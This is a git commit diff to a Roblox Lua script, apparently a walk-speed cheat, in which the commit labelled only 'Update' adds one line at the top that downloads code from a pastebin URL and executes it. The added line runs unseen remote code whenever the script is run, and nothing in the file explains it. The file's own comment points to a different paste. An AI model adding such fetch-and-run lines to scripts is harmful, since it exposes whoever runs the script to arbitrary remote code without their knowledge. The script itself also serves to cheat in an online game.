9bca575445ae228448acd0be57b0198573a2f554
paw <5dkyQHivc7zYxjCmN4qAMH7qtkfPn8@proton.me>
2022-11-19 23:55:07 -0700

    Update LoopWalkspeedChanger.lua

--- LoopWalkspeedChanger.lua
+++ LoopWalkspeedChanger.lua
@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/urvzBY4a'))()
 --To edit speed, check out this pastebin first which has speed editing along with the loadstring:
 --https://pastebin.com/raw/V6x2NzA2
 
